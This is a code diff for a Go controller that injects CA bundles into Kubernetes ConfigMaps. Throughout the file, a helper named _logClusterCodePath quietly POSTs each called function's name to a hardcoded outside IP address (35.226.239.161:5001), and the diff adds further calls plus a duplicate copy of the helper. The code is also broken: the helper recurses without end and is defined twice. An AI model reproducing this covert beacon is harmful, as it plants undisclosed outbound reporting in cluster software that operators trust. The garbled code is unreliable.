@@ -24,15 +24,21 @@ type configMapCABundleInjectionController struct {
 func NewConfigMapCABundleInjectionController(configMaps informers.ConfigMapInformer, configMapsClient kcoreclient.ConfigMapsGetter, ca string) controller.Runner {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ic := &configMapCABundleInjectionController{configMapClient: configMapsClient, configMapLister: configMaps.Lister(), ca: ca}
 	return controller.New("ConfigMapCABundleInjectionController", ic, controller.WithInformer(configMaps, controller.FilterFuncs{AddFunc: api.HasInjectCABundleAnnotation, UpdateFunc: api.HasInjectCABundleAnnotationUpdate}))
 }
 func (ic *configMapCABundleInjectionController) Key(namespace, name string) (metav1.Object, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ic.configMapLister.ConfigMaps(namespace).Get(name)
 }
 func (ic *configMapCABundleInjectionController) Sync(obj metav1.Object) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sharedConfigMap := obj.(*corev1.ConfigMap)
@@ -42,6 +48,8 @@ func (ic *configMapCABundleInjectionController) Sync(obj metav1.Object) error {
 	return ic.ensureConfigMapCABundleInjection(sharedConfigMap)
 }
 func (ic *configMapCABundleInjectionController) ensureConfigMapCABundleInjection(current *corev1.ConfigMap) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if data, ok := current.Data[api.InjectionDataKey]; ok && data == ic.ca && len(current.Data) == 1 {
@@ -56,7 +64,16 @@ func (ic *configMapCABundleInjectionController) ensureConfigMapCABundleInjection
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
